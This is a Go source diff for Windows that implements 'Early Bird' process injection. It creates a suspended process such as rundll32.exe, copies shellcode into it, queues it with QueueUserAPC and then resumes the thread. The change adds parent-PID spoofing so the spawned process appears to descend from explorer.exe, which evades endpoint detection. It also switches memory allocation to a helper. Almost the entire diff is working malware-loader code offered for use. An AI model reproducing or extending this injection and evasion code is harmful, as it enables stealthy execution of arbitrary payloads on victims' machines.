@@ -1,3 +1,6 @@
+//go:build windows
+// +build windows
+
 package main
 
 import (
@@ -6,81 +9,66 @@ import (
 	"unsafe"
 )
 
+func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
+	return doQueueUserAPC(hProc, pid, sc)
+}
+
 func doEarlyBirdInject(targetExe string, sc []byte) error {
 	if targetExe == "" {
 		targetExe = "rundll32.exe"
 	}
 	exePath := resolveSystem32Path(targetExe)
 
-	type startupInfo struct {
-		cb               uint32
-		lpReserved       *uint16
-		lpDesktop        *uint16
-		lpTitle          *uint16
-		dwX              uint32
-		dwY              uint32
-		dwXSize          uint32
-		dwYSize          uint32
-		dwXCountChars    uint32
-		dwYCountChars    uint32
-		dwFillAttribute  uint32
-		dwFlags          uint32
-		wShowWindow      uint16
-		cbReserved2      uint16
-		lpReserved2      *byte
-		hStdInput        uintptr
-		hStdOutput       uintptr
-		hStdError        uintptr
+	var hProc uintptr
+	var hThread uintptr
+
+	if ppidSpoofEnabled {
+		parentPID := findPidByName("explorer.exe")
+		if parentPID != 0 {
+			hp, ht, _, err := createProcessWithPPIDSpoof(exePath, exePath, parentPID)
+			if err == nil {
+				hProc = hp
+				hThread = ht
+			} else if Debug {
+				fmt.Printf("[!] PPID spoof failed in early bird (%v), falling back\n", err)
+			}
+		} else if Debug {
+			fmt.Println("[!] explorer.exe not found, skipping PPID spoof in early bird")
+		}
 	}
 
-	type processInformation struct {
-		hProcess    uintptr
-		hThread     uintptr
-		dwProcessID uint32
-		dwThreadID  uint32
+	if hProc == 0 {
+		si := &startupInfoExW{cb: uint32(unsafe.Sizeof(startupInfoExW{}))}
+		pi := processInformation{}
+
+		exePtr, _ := syscall.UTF16PtrFromString(exePath)
+		cmdLine, _ := syscall.UTF16PtrFromString(exePath)
+
+		ret, _, _ := procCreateProcessW.Call(
+			uintptr(unsafe.Pointer(exePtr)),
+			uintptr(unsafe.Pointer(cmdLine)),
+			0, 0, 0,
+			uintptr(createSuspended),
+			0, 0,
+			uintptr(unsafe.Pointer(si)),
+			uintptr(unsafe.Pointer(&pi)),
+		)
+		if ret == 0 {
+			return fmt.Errorf("CreateProcess failed")
+		}
+		hProc = pi.hProcess
+		hThread = pi.hThread
+	}
+	defer procCloseHandle.Call(hProc)
+	defer procCloseHandle.Call(hThread)
+
+	addr, err := allocateRX(hProc, sc)
+	if err != nil {
+		return fmt.Errorf("allocateRX in spawned process failed: %w", err)
 	}
 
-	si := &startupInfo{cb: uint32(unsafe.Sizeof(startupInfo{}))}
-	pi := &processInformation{}
-
-	exePtr, _ := syscall.UTF16PtrFromString(exePath)
-	cmdLine, _ := syscall.UTF16PtrFromString(exePath)
-
-	ret, _, _ := procCreateProcessW.Call(
-		uintptr(unsafe.Pointer(exePtr)),
-		uintptr(unsafe.Pointer(cmdLine)),
-		0, 0, 0,
-		0x00000004,
-		0, 0,
-		uintptr(unsafe.Pointer(si)),
-		uintptr(unsafe.Pointer(pi)),
-	)
-	if ret == 0 {
-		return fmt.Errorf("CreateProcess failed")
-	}
-	defer procCloseHandle.Call(pi.hProcess)
-	defer procCloseHandle.Call(pi.hThread)
-
-	addr, _, _ := procVirtualAllocEx.Call(
-		pi.hProcess, 0,
-		uintptr(len(sc)),
-		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_EXECUTE_READWRITE),
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx in spawned process failed")
-	}
-
-	var written uintptr
-	procWriteProcessMemory.Call(
-		pi.hProcess, addr,
-		uintptr(unsafe.Pointer(&sc[0])),
-		uintptr(len(sc)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-
-	procQueueUserAPC.Call(addr, pi.hThread, 0)
-	procResumeThread.Call(pi.hThread)
+	procQueueUserAPC.Call(addr, hThread, 0)
+	procResumeThread.Call(hThread)
 
 	return nil
 }
